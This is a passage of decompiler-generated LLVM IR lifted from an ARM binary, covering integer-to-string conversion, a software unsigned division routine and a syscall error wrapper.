  store i32 32, i32* %r5.global-to-local, align 4
  %v2_10d04 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_10d04, i32* @r7, align 4
  br label %dec_label_pc_10d08

dec_label_pc_10d08:                               ; preds = %bb45, %.thread6
  %v0_10d08 = phi i32 [ %v0_10d2c, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_10d08, i32* %r0.global-to-local, align 4
  %v0_10d0c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d0c, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_10d08, 16777216
  %v1_10d10 = sdiv i32 %sext, 16777216
  %v3_10d10 = call i32 @function_10ea4(i32 %v1_10d10, i32 %v0_10d0c)
  %v7_10d14 = icmp eq i32 %v0_10d0c, 9
  store i1 %v7_10d14, i1* %cpsr_z.global-to-local, align 1
  %v1_10d18 = add i32 %v0_10d0c, 48
  %v0_10d1c = load i32, i32* @r4, align 4
  store i32 %v0_10d1c, i32* @r0, align 4
  %v7_10d20 = icmp sgt i32 %v0_10d0c, 9
  %extract.t = trunc i32 %v1_10d18 to i8
  br i1 %v7_10d20, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_10d08
  %v9_10d20 = add i32 %v0_10d0c, 55
  %extract.t27 = trunc i32 %v9_10d20 to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_10d08, %bb44
  %v0_10d28.off0 = phi i8 [ %extract.t, %dec_label_pc_10d08 ], [ %extract.t27, %bb44 ]
  %v0_10d24 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10d24, i32* @r1, align 4
  %v2_10d28 = load i32, i32* %r5.global-to-local, align 4
  %v3_10d28 = load i32, i32* @r7, align 4
  %v4_10d28 = add i32 %v3_10d28, %v2_10d28
  %v5_10d28 = inttoptr i32 %v4_10d28 to i8*
  store i8 %v0_10d28.off0, i8* %v5_10d28, align 1
  %v0_10d2c = call i32 @function_10da8()
  store i32 %v0_10d2c, i32* %r0.global-to-local, align 4
  store i32 %v0_10d2c, i32* @r4, align 4
  %v2_10d30 = icmp eq i32 %v0_10d2c, 0
  store i1 %v2_10d30, i1* %cpsr_z.global-to-local, align 1
  %v0_10d34 = load i32, i32* %r5.global-to-local, align 4
  %v1_10d34 = add i32 %v0_10d34, -1
  store i32 %v1_10d34, i32* %r5.global-to-local, align 4
  br i1 %v2_10d30, label %dec_label_pc_10d3c, label %dec_label_pc_10d08

dec_label_pc_10d3c:                               ; preds = %bb45
  %v0_10d3c = load i32, i32* %sl.global-to-local, align 4
  %v2_10d3c = icmp eq i32 %v0_10d3c, 0
  store i1 %v2_10d3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d3c, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10d3c
  %v3_10d40 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10d44 = add i32 %v1_10d34, %v3_10d40
  store i32 %v3_10d44, i32* %r2.global-to-local, align 4
  %v4_10d4c = add i32 %v3_10d44, -34
  %v5_10d4c = inttoptr i32 %v4_10d4c to i8*
  store i8 45, i8* %v5_10d4c, align 1
  %v0_10d50.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10d50.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10d50.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10d3c
  %v1_10d50 = phi i32 [ %v1_10d34, %dec_label_pc_10d3c ], [ %v1_10d50.pre, %.thread11 ]
  %v2_10d50 = add i32 %v1_10d50, 1
  store i32 %v2_10d50, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10d5c = phi i32 [ %v2_10d50, %.thread12 ], [ %v1_10d50.pre, %.thread11 ]
  %v0_10d54 = load i32, i32* @r7, align 4
  %v2_10d54 = add i32 %v0_10d54, %v1_10d5c
  %v3_10d54 = inttoptr i32 %v2_10d54 to i8*
  %v4_10d54 = load i8, i8* %v3_10d54, align 1
  %v6_10d54 = zext i8 %v4_10d54 to i32
  %v2_10d58 = icmp eq i8 %v4_10d54, 0
  store i1 %v2_10d58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10d54, i32* %r2.global-to-local, align 4
  br i1 %v2_10d58, label %dec_label_pc_10da0, label %dec_label_pc_10d68.preheader

dec_label_pc_10d68.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d68

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10d68.preheader, %dec_label_pc_10d68
  %v0_10d68 = phi i32 [ 0, %dec_label_pc_10d68.preheader ], [ %v1_10d68, %dec_label_pc_10d68 ]
  %v1_10d68 = add i32 %v0_10d68, 1
  store i32 %v1_10d68, i32* %r1.global-to-local, align 4
  %v2_10d6c = add i32 %v1_10d68, %v2_10d54
  %v3_10d6c = inttoptr i32 %v2_10d6c to i8*
  %v4_10d6c = load i8, i8* %v3_10d6c, align 1
  %v2_10d70 = icmp eq i8 %v4_10d6c, 0
  store i1 %v2_10d70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10d70, label %dec_label_pc_10d78, label %dec_label_pc_10d68

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d68, %dec_label_pc_10da0
  %v0_10d7c24 = phi i32 [ %v6_10d54, %dec_label_pc_10da0 ], [ %v1_10d68, %dec_label_pc_10d68 ]
  %v0_10d78 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10d78, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d7c

dec_label_pc_10d7c:                               ; preds = %dec_label_pc_10d7c.dec_label_pc_10d7c_crit_edge, %dec_label_pc_10d78
  %v2_10d88 = phi i32 [ %v5_10d88, %dec_label_pc_10d7c.dec_label_pc_10d7c_crit_edge ], [ %v0_10d78, %dec_label_pc_10d78 ]
  %v0_10d80 = phi i32 [ %v0_10d80.pre, %dec_label_pc_10d7c.dec_label_pc_10d7c_crit_edge ], [ %v2_10d54, %dec_label_pc_10d78 ]
  %v0_10d7c = phi i32 [ %v0_10d7c.pre, %dec_label_pc_10d7c.dec_label_pc_10d7c_crit_edge ], [ %v0_10d7c24, %dec_label_pc_10d78 ]
  %v1_10d7c = add i32 %v0_10d7c, -1
  store i32 %v1_10d7c, i32* %r1.global-to-local, align 4
  %v1_10d80 = inttoptr i32 %v0_10d80 to i8*
  %v2_10d80 = load i8, i8* %v1_10d80, align 1
  %v5_10d80 = add i32 %v0_10d80, 1
  store i32 %v5_10d80, i32* %r2.global-to-local, align 4
  %v3_10d84 = icmp eq i32 %v0_10d7c, 0
  store i1 %v3_10d84, i1* %cpsr_z.global-to-local, align 1
  %v3_10d88 = inttoptr i32 %v2_10d88 to i8*
  store i8 %v2_10d80, i8* %v3_10d88, align 1
  %v4_10d88 = load i32, i32* %r0.global-to-local, align 4
  %v5_10d88 = add i32 %v4_10d88, 1
  store i32 %v5_10d88, i32* %r0.global-to-local, align 4
  br i1 %v3_10d84, label %dec_label_pc_10d90, label %dec_label_pc_10d7c.dec_label_pc_10d7c_crit_edge

dec_label_pc_10d7c.dec_label_pc_10d7c_crit_edge:  ; preds = %dec_label_pc_10d7c
  %v0_10d7c.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10d80.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10d7c

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d7c, %.thread1, %dec_label_pc_10cac
  %v0_10d90 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10d90, i32* %r0.global-to-local, align 4
  store i32 %v3_10cac, i32* @r4, align 4
  store i32 %v12_10cac, i32* @r7, align 4
  ret i32 %v0_10d90

dec_label_pc_10da0:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10d54, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d78

; uselistorder directives
  uselistorder i32 %v5_10d88, { 1, 0 }
  uselistorder i1 %v3_10d84, { 1, 0 }
  uselistorder i32 %v0_10d80, { 1, 0 }
  uselistorder i32 %v1_10d68, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10d54, { 1, 0 }
  uselistorder i32 %v2_10d54, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10d50.pre, { 1, 0 }
  uselistorder i32 %v1_10d34, { 1, 0, 2 }
  uselistorder i32 %v0_10d2c, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10d0c, { 2, 0, 1, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_10cb0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 9, 10, 11, 12 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d78, { 1, 0 }
  uselistorder label %dec_label_pc_10d68, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_10cd4, { 2, 1, 0 }
}

define i32 @function_10da8() local_unnamed_addr {
dec_label_pc_10da8:
  %r2.global-to-local = alloca i32, align 4
  %v0_10da8 = load i32, i32* @r1, align 4
  %v1_10da8 = add i32 %v0_10da8, -1
  store i32 %v1_10da8, i32* %r2.global-to-local, align 4
  %v2_10da8 = icmp eq i32 %v0_10da8, 0
  %v7_10da8 = icmp eq i32 %v0_10da8, 1
  %v0_10dac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_10da8, i32 %v0_10dac)
  br i1 %v2_10da8, label %dec_label_pc_10e90, label %dec_label_pc_10db4

dec_label_pc_10db4:                               ; preds = %dec_label_pc_10da8
  %v0_10db4 = load i32, i32* @r0, align 4
  %v1_10db4 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_10db4, %v1_10db4
  br i1 %tmp, label %dec_label_pc_10dbc, label %dec_label_pc_10e48

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10db4
  %v1_10dbc = load i32, i32* %r2.global-to-local, align 4
  %v2_10dbc = and i32 %v1_10dbc, %v1_10db4
  %v4_10dbc = icmp eq i32 %v2_10dbc, 0
  br i1 %v4_10dbc, label %dec_label_pc_10e54, label %dec_label_pc_10dc4

dec_label_pc_10dc4:                               ; preds = %dec_label_pc_10dbc
  %v3_10dc4 = icmp ult i32 %v1_10db4, 536870912
  br i1 %v3_10dc4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10dc4
  %v4_10dc8 = mul i32 %v1_10db4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10dc4, %.thread
  %v0_10de8.pr36.ph = phi i32 [ %v4_10dc8, %.thread ], [ %v1_10db4, %dec_label_pc_10dc4 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10dc4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_10de8.pr36 = phi i32 [ %v4_10ddc, %bb81 ], [ %v0_10de8.pr36.ph, %.preheader.preheader ]
  %v1_10de0 = phi i32 [ %v4_10de0, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_10dd4 = icmp ugt i32 %v0_10de8.pr36, 268435455
  br i1 %v2_10dd4, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_10de8thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_10dd8 = icmp ult i32 %v0_10de8.pr36, %v0_10db4
  br i1 %v4_10dd8, label %bb80, label %dec_label_pc_10de8thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_10ddc = and i32 %v0_10de8.pr36, 268435456
  %v3_10ddc = icmp eq i32 %v2_10ddc, 0
  %v4_10ddc = mul i32 %v0_10de8.pr36, 16
  br i1 %v3_10ddc, label %bb81, label %dec_label_pc_10de8.loopexit

bb81:                                             ; preds = %bb80
  %v2_10de0 = and i32 %v1_10de0, 268435456
  %v3_10de0 = icmp eq i32 %v2_10de0, 0
  %v4_10de0 = mul i32 %v1_10de0, 16
  br i1 %v3_10de0, label %.preheader, label %dec_label_pc_10de8thread-pre-split.loopexit.loopexit

dec_label_pc_10de8thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_10df448.ph = phi i32 [ %v1_10de0, %bb ], [ %v4_10de0, %bb81 ]
  %v0_10de8.pr38.ph = phi i32 [ %v0_10de8.pr36, %bb ], [ %v4_10ddc, %bb81 ]
  br label %dec_label_pc_10de8thread-pre-split.loopexit

dec_label_pc_10de8thread-pre-split.loopexit:      ; preds = %dec_label_pc_10de8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_10df448 = phi i32 [ %v1_10de0, %.thread2 ], [ %v1_10df448.ph, %dec_label_pc_10de8thread-pre-split.loopexit.loopexit ]
  %v0_10de8.pr38 = phi i32 [ %v0_10de8.pr36, %.thread2 ], [ %v0_10de8.pr38.ph, %dec_label_pc_10de8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10de8thread-pre-split

dec_label_pc_10de8thread-pre-split:               ; preds = %dec_label_pc_10de8thread-pre-split.loopexit, %bb83
  %v1_10df446 = phi i32 [ %v1_10df448, %dec_label_pc_10de8thread-pre-split.loopexit ], [ %v3_10df4, %bb83 ]
  %v0_10de8.pr = phi i32 [ %v0_10de8.pr38, %dec_label_pc_10de8thread-pre-split.loopexit ], [ %v3_10df0, %bb83 ]
  br label %dec_label_pc_10de8

dec_label_pc_10de8.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_10de8

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10de8.loopexit, %dec_label_pc_10de8thread-pre-split
  %v1_10df4 = phi i32 [ %v1_10df446, %dec_label_pc_10de8thread-pre-split ], [ %v1_10de0, %dec_label_pc_10de8.loopexit ]
  %v1_10df0 = phi i32 [ %v0_10de8.pr, %dec_label_pc_10de8thread-pre-split ], [ %v4_10ddc, %dec_label_pc_10de8.loopexit ]
  %v2_10de8 = icmp slt i32 %v1_10df0, 0
  br i1 %v2_10de8, label %dec_label_pc_10dfc, label %bb82

bb82:                                             ; preds = %dec_label_pc_10de8
  %v4_10dec = icmp ult i32 %v1_10df0, %v0_10db4
  br i1 %v4_10dec, label %bb83, label %dec_label_pc_10dfc

bb83:                                             ; preds = %bb82
  %v3_10df0 = mul i32 %v1_10df0, 2
  %v2_10df4 = icmp slt i32 %v1_10df4, 0
  %v3_10df4 = mul i32 %v1_10df4, 2
  br i1 %v2_10df4, label %dec_label_pc_10dfc, label %dec_label_pc_10de8thread-pre-split

dec_label_pc_10dfc:                               ; preds = %bb82, %dec_label_pc_10de8, %bb83
  %v2_10e0859 = phi i32 [ %v3_10df4, %bb83 ], [ %v1_10df4, %bb82 ], [ %v1_10df4, %dec_label_pc_10de8 ]
  %v1_10e0051 = phi i32 [ %v3_10df0, %bb83 ], [ %v1_10df0, %bb82 ], [ %v1_10df0, %dec_label_pc_10de8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %.thread11, %dec_label_pc_10dfc
  %v1_10e34 = phi i32 [ %v4_10e34, %.thread11 ], [ %v2_10e0859, %dec_label_pc_10dfc ]
  %v1_10e08 = phi i32 [ %v0_10e40, %.thread11 ], [ 0, %dec_label_pc_10dfc ]
  %v1_10e38 = phi i32 [ %v4_10e38, %.thread11 ], [ %v1_10e0051, %dec_label_pc_10dfc ]
  %v1_10e04 = phi i32 [ %v0_10e30, %.thread11 ], [ %v0_10db4, %dec_label_pc_10dfc ]
  %v3_10e00 = icmp ult i32 %v1_10e04, %v1_10e38
  br i1 %v3_10e00, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10e00
  %v3_10e04 = sub i32 %v1_10e04, %v1_10e38
  %v3_10e08 = or i32 %v1_10e08, %v1_10e34
  store i32 %v3_10e08, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10e00, %bb84
  %v1_10e10 = phi i32 [ %v1_10e04, %dec_label_pc_10e00 ], [ %v3_10e04, %bb84 ]
  %v1_10e14 = phi i32 [ %v1_10e08, %dec_label_pc_10e00 ], [ %v3_10e08, %bb84 ]
  %v4_10e0c = udiv i32 %v1_10e38, 2
  %v6_10e0c = icmp ult i32 %v1_10e10, %v4_10e0c
  br i1 %v6_10e0c, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10e10 = urem i32 %v1_10e38, 2
  %v4_10e10 = icmp eq i32 %v3_10e10, 0
  %v6_10e10 = sub i32 %v1_10e10, %v4_10e0c
  br i1 %v4_10e10, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10e14 = udiv i32 %v1_10e34, 2
  %v6_10e14 = or i32 %v1_10e14, %v5_10e14
  store i32 %v6_10e14, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10e1c = phi i32 [ %v6_10e10, %bb85 ], [ %v1_10e10, %.thread7 ], [ %v6_10e10, %bb86 ]
  %v1_10e20 = phi i32 [ %v1_10e14, %bb85 ], [ %v1_10e14, %.thread7 ], [ %v6_10e14, %bb86 ]
  %v4_10e18 = udiv i32 %v1_10e38, 4
  %v6_10e18 = icmp ult i32 %v1_10e1c, %v4_10e18
  br i1 %v6_10e18, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10e1c = and i32 %v1_10e38, 2
  %v4_10e1c = icmp eq i32 %v3_10e1c, 0
  %v6_10e1c = sub i32 %v1_10e1c, %v4_10e18
  br i1 %v4_10e1c, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10e20 = udiv i32 %v1_10e34, 4
  %v6_10e20 = or i32 %v1_10e20, %v5_10e20
  store i32 %v6_10e20, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_10e28 = phi i32 [ %v6_10e1c, %bb87 ], [ %v1_10e1c, %.thread8 ], [ %v6_10e1c, %bb88 ]
  %v1_10e2c = phi i32 [ %v1_10e20, %bb87 ], [ %v1_10e20, %.thread8 ], [ %v6_10e20, %bb88 ]
  %v4_10e24 = udiv i32 %v1_10e38, 8
  %v6_10e24 = icmp ult i32 %v1_10e28, %v4_10e24
  br i1 %v6_10e24, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_10e28 = and i32 %v1_10e38, 4
  %v4_10e28 = icmp eq i32 %v3_10e28, 0
  %v6_10e28 = sub i32 %v1_10e28, %v4_10e24
  br i1 %v4_10e28, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10e2c = udiv i32 %v1_10e34, 8
  %v6_10e2c = or i32 %v1_10e2c, %v5_10e2c
  store i32 %v6_10e2c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10e40 = phi i32 [ %v1_10e2c, %bb89 ], [ %v1_10e2c, %.thread9 ], [ %v6_10e2c, %bb90 ]
  %v0_10e30 = phi i32 [ %v6_10e28, %bb89 ], [ %v1_10e28, %.thread9 ], [ %v6_10e28, %bb90 ]
  %v2_10e30 = icmp eq i32 %v0_10e30, 0
  br i1 %v2_10e30, label %dec_label_pc_10e40, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_10e34, 16
  br i1 %tmp138, label %dec_label_pc_10e40, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_10e34 = udiv i32 %v1_10e34, 16
  %v4_10e38 = udiv i32 %v1_10e38, 16
  br label %dec_label_pc_10e00

dec_label_pc_10e40:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_10e40

dec_label_pc_10e48:                               ; preds = %dec_label_pc_10db4
  %v9_10db4 = icmp eq i32 %v0_10db4, %v1_10db4
  %. = zext i1 %v9_10db4 to i32
  ret i32 %.

dec_label_pc_10e54:                               ; preds = %dec_label_pc_10dbc
  %v2_10e54 = icmp ugt i32 %v1_10db4, 65535
  br i1 %v2_10e54, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10e54
  %v2_10e58 = and i32 %v1_10db4, 32768
  %v3_10e58 = icmp eq i32 %v2_10e58, 0
  %v4_10e58 = udiv i32 %v1_10db4, 65536
  br i1 %v3_10e58, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10e54
  %v0_10e6465 = phi i32 [ %v1_10db4, %dec_label_pc_10e54 ], [ %v4_10e58, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_10e68 = phi i32 [ %v0_10e6465, %.thread16 ], [ %v4_10e58, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10e64 = icmp ugt i32 %v1_10e68, 255
  br i1 %v2_10e64, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_10e68 = and i32 %v1_10e68, 128
  %v3_10e68 = icmp eq i32 %v2_10e68, 0
  %v4_10e68 = udiv i32 %v1_10e68, 256
  br i1 %v3_10e68, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10e6c = or i32 %storemerge, 8
  store i32 %v2_10e6c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_10e78 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10e6c, %bb98 ]
  %v1_10e74 = phi i32 [ %v1_10e68, %bb96 ], [ %v4_10e68, %bb97 ], [ %v4_10e68, %bb98 ]
  %v2_10e70 = icmp ugt i32 %v1_10e74, 15
  br i1 %v2_10e70, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10e74 = and i32 %v1_10e74, 8
  %v3_10e74 = icmp eq i32 %v2_10e74, 0
  %v4_10e74 = udiv i32 %v1_10e74, 16
  br i1 %v3_10e74, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_10e78 = add nsw i32 %v1_10e78, 4
  store i32 %v2_10e78, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_10e80 = phi i32 [ %v1_10e78, %.thread17 ], [ %v1_10e78, %bb99 ], [ %v2_10e78, %bb100 ]
  %v5_10e84 = phi i32 [ %v1_10e74, %.thread17 ], [ %v4_10e74, %bb99 ], [ %v4_10e74, %bb100 ]
  %v2_10e7c = icmp ugt i32 %v5_10e84, 3
  %v7_10e7c = icmp eq i32 %v5_10e84, 4
  %v2_10e80 = xor i1 %v7_10e7c, true
  %v3_10e80 = and i1 %v2_10e7c, %v2_10e80
  br i1 %v3_10e80, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_10e80 = add nsw i32 %v4_10e80, 3
  store i32 %v5_10e80, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_10e84 = phi i32 [ %v4_10e80, %.thread18 ], [ %v5_10e80, %bb101 ]
  %v2_10e84 = xor i1 %v2_10e7c, true
  %v3_10e84 = or i1 %v7_10e7c, %v2_10e84
  br i1 %v3_10e84, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_10e84 = udiv i32 %v5_10e84, 2
  %v9_10e84 = add i32 %v4_10e84, %v8_10e84
  store i32 %v9_10e84, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_10e88 = phi i32 [ %v4_10e84, %bb102 ], [ %v9_10e84, %bb103 ]
  %v6_10e88 = lshr i32 %v0_10db4, %v1_10e88
  ret i32 %v6_10e88

dec_label_pc_10e90:                               ; preds = %dec_label_pc_10da8
  %v0_10e90 = load i32, i32* @lr, align 4
  %v0_10e94 = call i32 @function_10ebc()
  store i32 %v0_10e90, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10e84, { 1, 0 }
  uselistorder i1 %v7_10e7c, { 1, 0 }
  uselistorder i32 %v4_10e74, { 1, 0 }
  uselistorder i32 %v1_10e74, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10e6c, { 1, 0 }
  uselistorder i32 %v4_10e68, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10e68, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10e58, { 1, 0 }
  uselistorder i32 %v0_10e30, { 1, 0 }
  uselistorder i32 %v4_10e24, { 1, 0 }
  uselistorder i32 %v1_10e2c, { 1, 2, 0 }
  uselistorder i32 %v4_10e18, { 1, 0 }
  uselistorder i32 %v1_10e20, { 1, 2, 0 }
  uselistorder i32 %v4_10e0c, { 1, 0 }
  uselistorder i32 %v1_10e14, { 1, 2, 0 }
  uselistorder i32 %v1_10e38, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_10e08, { 1, 0 }
  uselistorder i32 %v1_10e34, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10df4, { 1, 0 }
  uselistorder i32 %v3_10df0, { 1, 0 }
  uselistorder i32 %v1_10df0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10df4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10de0, { 1, 0 }
  uselistorder i32 %v4_10ddc, { 2, 1, 0 }
  uselistorder i32 %v1_10de0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10de8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_10db4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_10db4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_10da8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10e40, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10dfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10de8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_10ea4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10ea4:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_10ea8 = call i32 @function_10da8()
  ret i32 %v0_10ea8
}

define i32 @function_10ebc() local_unnamed_addr {
dec_label_pc_10ebc:
  %v1_10ec4 = call i32 @function_11b24(i32 8)
  ret i32 %v1_10ec4
}

define i32 @function_10ed0() local_unnamed_addr {
dec_label_pc_10ed0:
  %v1_10ee0 = load i32, i32* @r0, align 4
  ret i32 %v1_10ee0
}

define i32 @function_10ee4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10ee4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ee4 = load i32, i32* @r7, align 4
  store i32 %v3_10ee4, i32* %stack_var_-8, align 4
  %v0_10ef0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10ef0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ef0, -4095
  br i1 %tmp, label %dec_label_pc_10f10, label %dec_label_pc_10f00

dec_label_pc_10f00:                               ; preds = %dec_label_pc_10ee4
  %v0_10f00 = call i32 @function_11734()
  %v0_10f04 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f04 = sub i32 0, %v0_10f04
  %v2_10f08 = inttoptr i32 %v0_10f00 to i32*
  store i32 %v1_10f04, i32* %v2_10f08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10f10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10ee4, %dec_label_pc_10f00
  %v1_10f14 = phi i32 [ %v0_10ef0, %dec_label_pc_10ee4 ], [ -1, %dec_label_pc_10f00 ]
  %v2_10f10 = phi i32 [ %v3_10ee4, %dec_label_pc_10ee4 ], [ %v2_10f10.pre, %dec_label_pc_10f00 ]
  store i32 %v2_10f10, i32* @r7, align 4
  ret i32 %v1_10f14

; uselistorder directives
  uselistorder i32 %v0_10ef0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f10, { 1, 0 }
}

define i32 @function_10f18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10f18:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_10f18 = load i32, i32* @r2, align 4
